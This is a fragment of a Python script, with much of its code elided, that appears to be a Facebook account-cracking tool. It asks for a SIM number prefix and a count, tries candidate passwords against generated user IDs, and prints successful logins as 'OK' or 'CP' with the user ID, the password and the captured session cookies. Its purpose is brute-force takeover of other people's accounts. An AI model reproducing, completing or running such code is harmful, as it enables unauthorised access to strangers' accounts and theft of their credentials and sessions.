...
import os,sys,time,json,random,re,base64,uuid
...
def Menu():
    clear()
    slw(f"{rajx.GREEN}\tWELCOME TO EXAMPLE_NAME PROJECT")
    clear()
...
def xxr():
    ...
    os.geteuid
    clear()
    rajx.p(f" {rajx.WHITE}[{rajx.GREEN}✔{rajx.WHITE}] Example >>{rajx.GREEN} 017 {rajx.WHITE}<> {rajx.GREEN}018{rajx.WHITE} <>{rajx.GREEN} 019{rajx.WHITE} <> {rajx.GREEN}016 {rajx.WHITE}<>{rajx.GREEN} 015{rajx.WHITE} <<")
    rajx.line()
    code = input(f"\n {rajx.WHITE}[{rajx.GREEN}✔{rajx.WHITE}] Input Sim Code {rajx.RED}>>{rajx.GREEN} ")
    clear()
    rajx.p(f" {rajx.WHITE}[{rajx.GREEN}✔{rajx.WHITE}] Example >>{rajx.GREEN} 1000 {rajx.WHITE}<> {rajx.GREEN}2000 {rajx.WHITE}<> {rajx.GREEN}5000 {rajx.WHITE}<> {rajx.GREEN}1000{rajx.WHITE} <<")
    rajx.line()
    try:
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                rajx.p(f"\r {rajx.GREEN}[SHORT_NAME-OK] {uid}{rajx.WHITE} | {rajx.GREEN}{ps}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                rajx.p('\r \033[1;90m[SHORT_NAME-CP] '+uid+'  | '+ps+'\n')
